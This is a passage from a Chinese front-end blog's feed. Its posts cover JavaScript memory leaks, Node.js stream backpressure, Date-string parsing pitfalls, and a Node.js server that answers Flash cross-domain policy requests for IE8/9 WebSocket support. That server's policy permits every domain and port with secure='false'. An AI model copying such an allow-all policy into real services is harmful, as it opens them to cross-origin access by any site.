&lt;p&gt;单位时间内的内存变化量可能有三个值&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;正数：内存可能存在泄漏。生产环境，如果服务在启动后，该值一直是正值，从未出现负值或者趋近于0的值，那么极大的可能是存在内存泄漏的。&lt;/li&gt;
&lt;li&gt;趋近于0的值: 内存稳定维持&lt;/li&gt;
&lt;li&gt;负数：内存在释放&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/memory-leak-sharing/2022-10-29-11-48-15.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;实际上，在观察内存变化量时，需要有两个前提条件&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一定的负载压力：因为在开发或者功能测试环境，很少的用户，服务的压力很小，是很难观测到内存泄漏问题的。所以务必在一定的负载压力下观测。&lt;/li&gt;
&lt;li&gt;至少要观测一天：内存上涨并不一定意味着存在内存泄漏问题。在一个工作日中，某些时间点，是用户使用的高峰期，服务的负载很高，自然内存使用会增长。关键在于在高峰期过后的低谷期时，内存是否回下降到正常值。如果内存在低谷期时依然维持着高峰期时的内存使用，那么非常大可能是存在内存泄漏了。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下图是两个服务的。从第一天的0点开始观测服务的内存，一直到第二天的12点。正常的服务会随着负载的压力增加或者减少内存使用。而存在内存泄漏的服务，内存一直在上升，并且负载压力越大，上升的越快。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/memory-leak-sharing/2022-10-29-11-48-30.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;有没有可能避免内存泄漏&#34;&gt;有没有可能避免内存泄漏？&lt;/h1&gt;
&lt;p&gt;除非你不写代码，否者你是无法避免内存泄漏的问题的。&lt;/p&gt;
&lt;p&gt;第一，即使你是非常精通某个语言，也是有很多关于如何避免内存泄漏的经验。但是你的代码里仍然可能会包含其他库或者其他同事写的代码，那些代码里是无法保证是否存在内存泄漏问题的。
第二，内存泄漏的代码有时候非常难以察觉。例如console.log打印的太快，占用太多的buffer。网络流量激增，占用太多的Recv_Q，node无法及时处理。写文件太慢，没有处理“后压”相关的逻辑等等。&lt;/p&gt;
&lt;h1 id=&#34;为什么要关注内存泄漏&#34;&gt;为什么要关注内存泄漏？&lt;/h1&gt;
&lt;p&gt;为什么要关注内存泄漏？我们客户的服务器可是有500G内存的&lt;/p&gt;
&lt;p&gt;你可能有个很豪的金主。但是你不要忘记一个故事。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;传说国际象棋是由一位印度数学家发明的。国王十分感谢这位数学家，于是就请他自己说出想要得到什么奖赏。这位数学家想了一分钟后就提出请求——把1粒米放在棋盘的第1格里，2粒米放在第2格，4粒米放在第3格，8粒米放在第4格，依次类推，每个方格中的米粒数量都是之前方格中的米粒数量的2倍。&lt;/p&gt;
&lt;p&gt;国王欣然应允，诧异于数学家竟然只想要这么一点的赏赐——但随后却大吃了一惊。当他开始叫人把米放在棋盘上时，最初几个方格中的米粒少得像几乎不存在一样。但是，往第16个方格上放米粒时，就需要拿出1公斤的大米。而到了第20格时，他的那些仆人则需要推来满满一手推车的米。国王根本无法提供足够的大米放在棋盘上的第64格上去。因为此时，棋盘上米粒的数量会达到惊人的18 446 744 073 709 551 615粒。如果我们在伦敦市中心再现这一游戏，那么第64格中的米堆将延伸至M25环城公路，其高度将超过所有建筑的高度。事实上，这一堆米粒比过去1000年来全球大米的生产总量还要多得多。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;对于内存泄漏来说，可能500G都是不够用的。&lt;/p&gt;
&lt;p&gt;实际上操作系统对进程使用内存资源是有限制的，我们关注内存泄漏，实际上是关注内存泄漏会引起的最终问题：out of memory。如果进程使用的资源数引起了操作系统的注意，很可能进程被操作系统杀死。&lt;/p&gt;
&lt;p&gt;然后你的客户可能正在使用你的服务完成一个重要的事情，接着你们的客户投诉热线回被打爆，然后是你的老板，你的领导找你谈话~~~&lt;/p&gt;
&lt;h1 id=&#34;基本类型-vs-引用类型&#34;&gt;基本类型 vs 引用类型&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;基本类型：undefined, null, boolean, number, string。基本类型是按值访问&lt;/li&gt;
&lt;li&gt;引用类型的值实际上是指向内存中的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上面的说法来自《JavaScript高级程序设计》。但是对于基本类型字符串的定义，实际上我是有些不认同的。有些人也认为字符串不属于基本类型。&lt;/p&gt;
&lt;p&gt;就是关于字符串，我曾思考过，在JavaScript里，字符串的最大长度是多少，字符串最多能装下多少个字符？&lt;/p&gt;
&lt;p&gt;我个人认为，一个变量有固定的大小的内存占用，才是基本类型。例如数字，null, 布尔值，这些值很容易能理解他们会占用固定的内存大小。但是字符串就不一样了。字符串的长度是不固定，在不同的浏览器中，有些字符串最大可能占用256M的内存，甚至更多。&lt;/p&gt;
&lt;p&gt;可以参考这个问题：&lt;a href=&#34;https://stackoverflow.com/questions/34957890/javascript-string-size-limit-256-mb-for-me-is-it-the-same-for-all-browsers&#34;&gt;https://stackoverflow.com/questions/34957890/javascript-string-size-limit-256-mb-for-me-is-it-the-same-for-all-browsers&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;内存是一张图&#34;&gt;内存是一张图&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;1代表根节点，在NodeJS里是global对象，在浏览器中是window对象&lt;/li&gt;
&lt;li&gt;2-6代表对象&lt;/li&gt;
&lt;li&gt;7-8代表原始类型。分别有三种，字符串，数字，布尔值&lt;/li&gt;
&lt;li&gt;9-10代表从根节点无法到达的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注意，作为原始类型的值，&lt;strong&gt;在内存图中只能是叶子节点。&lt;/strong&gt;
**
从跟节点R0无法到达的节点9,10，将会在GC时被清除。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/memory-leak-sharing/2022-10-29-11-49-19.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;保留路径的含义是从跟对象到某一节点的最短路径。例如1-&amp;gt;2-&amp;gt;4-&amp;gt;6。&lt;/p&gt;
&lt;h1 id=&#34;对象保留树&#34;&gt;对象保留树&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;节点： 构造函数的名称&lt;/li&gt;
&lt;li&gt;边缘：对象的key&lt;/li&gt;
&lt;li&gt;距离: 节点到跟节点的最短距离&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;支配项dominators&#34;&gt;支配项(Dominators)&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;每个对象有且仅有一个支配项&lt;/li&gt;
&lt;li&gt;如果B存在从根节点到A节点之间的所有路径中，那么B是A的支配项，即B支配A。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下图中&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1支配2&lt;/li&gt;
&lt;li&gt;2支配3,4,6 (想想2为什么没有支配5？)&lt;/li&gt;
&lt;li&gt;3支配5&lt;/li&gt;
&lt;li&gt;6支配7&lt;/li&gt;
&lt;li&gt;5支配8&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;理解支配项的意义在于理解如何将资源释放&lt;/strong&gt;。如下图所示，如果目标是释放节点6的占用资源，仅仅释放节点3或者节点4是没有用的，必需释放其支配项节点2，才能将节点6释放。
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/memory-leak-sharing/2022-10-29-11-50-15.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>NodeJS Out of Memory: Backpressuring in Streams</title>
      <link>https://wdd.js.org/fe/oom-backpressuring-in-streams/</link>
      <pubDate>Sat, 29 Oct 2022 11:46:07 +0800</pubDate>
      <guid>https://wdd.js.org/fe/oom-backpressuring-in-streams/</guid>
      <description>&lt;p&gt;今天我收集了一份大概有40万行的日志，为了充分利用这份日志，我决定把日志给解析，解析完了之后，再写入mysql数据库。&lt;/p&gt;
&lt;p&gt;首先，对于40万行的日志，肯定不能一次性读取到内存。&lt;/p&gt;
&lt;p&gt;所以我用了NodeJs内置的readline模块。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;readline&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readline&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;line_no&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;readline&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;createInterface&lt;/span&gt;({
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;createReadStream&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./my.log&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;})
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rl&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;line&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;line&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;line_no&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;line&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;})
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// end
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rl&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;close&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;line&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Total lines : &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;line_no&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;})
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;数据解析以及写入到这块我没有贴代码。代码的执行是正常的，但是一段时间之后，程序就报错Out Of Memory。&lt;/p&gt;
&lt;p&gt;代码执行是在nodejs 10.16.3上运行的，谷歌搜了一下解决方案，看到有人说nodejs升级到12.x版本就可以解决这个问题。我抱着试试看的想法，升级了nodejs到最新版，果然没有再出现OOM的问题。&lt;/p&gt;
&lt;p&gt;后来我想，我终于深刻理解了NodeJS官网上的这篇文章 &lt;a href=&#34;https://nodejs.org/en/docs/guides/backpressuring-in-streams/&#34;&gt;Backpressuring in Streams&lt;/a&gt;，以前我也度过几遍，但是不太了解，这次接合实际情况。有了深刻理解。&lt;/p&gt;
&lt;p&gt;NodeJS在按行读取本地文件时，大概可以达到每秒1000行的速度，然而数据写入到MySql，大概每秒100次插入的样子。&lt;/p&gt;
&lt;p&gt;本身网络上存在的延迟就要比读取本地磁盘要慢，读到太多的数据无法处理，只能暂时积压到内存中，然而内存有限，最终OOM的异常就抛出了。&lt;/p&gt;
&lt;p&gt;NodeJS 12.x应该解决了这个问题。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://nodejs.org/en/docs/guides/backpressuring-in-streams/&#34;&gt;https://nodejs.org/en/docs/guides/backpressuring-in-streams/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>new Date(&#39;time string&#39;)的陷阱</title>
      <link>https://wdd.js.org/fe/trap-of-new-date/</link>
      <pubDate>Sat, 29 Oct 2022 11:44:26 +0800</pubDate>
      <guid>https://wdd.js.org/fe/trap-of-new-date/</guid>
      <description>&lt;p&gt;一般情况下，建议你不要用new Date(&amp;ldquo;time string&amp;rdquo;)的方式去做时间解析。因为不同浏览器，可能接受的time string的格式都不一样。&lt;/p&gt;
&lt;p&gt;你最好不要去先入为主，认为浏览器会支持的你的格式。&lt;/p&gt;
&lt;p&gt;常见的格式 2010-10-10 19:00:00 就这种格式，在IE11上是不接受的。&lt;/p&gt;
&lt;p&gt;下面的比较，在IE11上返回false, 在chrome上返回true。原因就在于，IE11不支持这种格式。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Date() &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Date(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2010-10-10 19:00:00&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以在时间处理上，最好选用比价靠谱的第三方库，例如dayjs， moment等等。&lt;/p&gt;
&lt;p&gt;千万不要先入为主！！&lt;/p&gt;</description>
    </item>
    <item>
      <title>IE8/9 支持WebSocket方案，flash安全策略</title>
      <link>https://wdd.js.org/fe/ie89-websocket-flash/</link>
      <pubDate>Sat, 29 Oct 2022 11:43:23 +0800</pubDate>
      <guid>https://wdd.js.org/fe/ie89-websocket-flash/</guid>
      <description>&lt;p&gt;IE8/9原生是不支持WebSocket的，但是我们可以使用flash去模拟一个WebSocket接口出来。&lt;/p&gt;
&lt;p&gt;这方面，&lt;a href=&#34;https://github.com/gimite/web-socket-js&#34;&gt;https://github.com/gimite/web-socket-js&lt;/a&gt;  已经可以使用。&lt;/p&gt;
&lt;p&gt;除了客户端之外，服务端需要做个flash安全策略设置。&lt;/p&gt;
&lt;p&gt;这里的服务端是指WebSocet服务器所在的服务端。默认端口是843端口。&lt;/p&gt;
&lt;p&gt;客户端使用flash模拟WebSocket时，会打开一个到服务端843端口的TCP链接。&lt;/p&gt;
&lt;p&gt;并且发送数据：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;lt;policy-file-request&amp;gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;服务端需要回应下面类似的内容&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;lt;?xml&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;version=&amp;#34;1.0&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;!DOCTYPE&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;cross-domain-policy&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;SYSTEM&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/xml/dtds/cross-domain-policy.dtd&amp;#34;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;cross-domain-policy&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;site-control&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;permitted-cross-domain-policies=&amp;#34;all&amp;#34;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;allow-access-from&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;domain=&amp;#34;*&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;to-ports=&amp;#34;*&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;secure=&amp;#34;false&amp;#34;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;allow-http-request-headers-from&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;domain=&amp;#34;*&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;headers=&amp;#34;*&amp;#34;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;/cross-domain-policy&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;nodejs实现&#34;&gt;Node.js实现&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;policy.js&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;module&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;exports&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;policyFile&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;!DOCTYPE cross-domain-policy SYSTEM &amp;#34;/xml/dtds/cross-domain-policy.dtd&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;cross-domain-policy&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;lt;site-control permitted-cross-domain-policies=&amp;#34;all&amp;#34;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;lt;allow-access-from domain=&amp;#34;*&amp;#34; to-ports=&amp;#34;*&amp;#34; secure=&amp;#34;false&amp;#34;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;lt;allow-http-request-headers-from domain=&amp;#34;*&amp;#34; headers=&amp;#34;*&amp;#34;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;/cross-domain-policy&amp;gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;index.js&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Net&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;net&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; {&lt;span style=&#34;color:#a6e22e&#34;&gt;policyFile&lt;/span&gt;} &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./policy&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;843&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;policyFile&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;server&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Net&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Server&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;server&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;listen&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Server listening for connection requests on socket localhost:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;server&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;connection&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A new connection has been established.&amp;#39;&lt;/span&gt;);
